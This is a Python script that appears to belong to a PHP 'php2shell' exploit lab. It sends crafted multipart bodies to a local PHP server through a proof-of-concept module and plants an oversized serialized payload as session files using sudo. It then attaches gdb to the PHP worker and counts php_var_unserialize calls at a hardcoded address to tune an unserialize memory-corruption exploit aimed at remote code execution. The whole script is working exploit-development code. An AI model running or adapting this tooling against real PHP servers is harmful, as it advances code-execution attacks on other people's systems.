#!/usr/bin/env python3
"""hit.py - count php_var_unserialize calls on one request (no shell drift)."""
import os
import subprocess
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import poc_unserialize as P

LAB = "/tmp/php2shell_ap"
BND = b"UctxPoc2026"
MAL = "/ndary=UctxPoc2026"
SESS = LAB + "/sess"
ARM = len(sys.argv) > 1 and sys.argv[1] == "arm"
N = int(sys.argv[2]) if len(sys.argv) > 2 else 2000

GDB = """set pagination off
python
class C(gdb.Breakpoint):
    def __init__(self):
        super().__init__("*0x7ffff68860e0")
    def stop(self):
        open('/tmp/hits.txt','a').write('x')
        return False
C()
end
continue
"""
open("/tmp/hits.txt", "w").close()

out = subprocess.run(["sudo", "bash", LAB + "/rce_lab.sh"], capture_output=True, text=True).stdout
parent = int(out.split("parent=")[1].split()[0])
child = int(out.split("child=")[1].split()[0])

sid = "h%d-abcdef" % N
if ARM:
    P.send("http://127.0.0.1:18120/index.php", P.arm_body(sid, BND, 20, 65536), BND, sid, 0, 0)
    time.sleep(1.3)
    P.send("http://127.0.0.1:18120/close.php", b"", b"bnd", sid, 0, 0)
    time.sleep(0.3)

inner = "".join("i:%d;a:2:{i:0;i:0;i:1;i:0;}" % i for i in range(N))
open("/tmp/h_pay", "wb").write(b"k|" + ("a:%d:{%s}" % (N, inner)).encode())
for d in (MAL, SESS):
    subprocess.run(["sudo", "cp", "/tmp/h_pay", "%s/sess_%s" % (d, sid)])
    subprocess.run(["sudo", "chmod", "666", "%s/sess_%s" % (d, sid)])
open("/tmp/cnt4.gdb", "w").write(GDB)
g = subprocess.Popen(["sudo", "gdb", "-q", "-p", str(child), "-batch", "-x", "/tmp/cnt4.gdb"],
                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
time.sleep(1.5)
st, d, _t = P.send("http://127.0.0.1:18120/peak.php", b"", b"bnd", sid, 0, 0)
time.sleep(1.2)
g.terminate()
print("arm=%s n=%d peak=%s hits=%d alive=%s body=%s" % (
    ARM, N, st, len(open("/tmp/hits.txt").read()),
    os.path.exists("/proc/%d" % child), d[:40]))
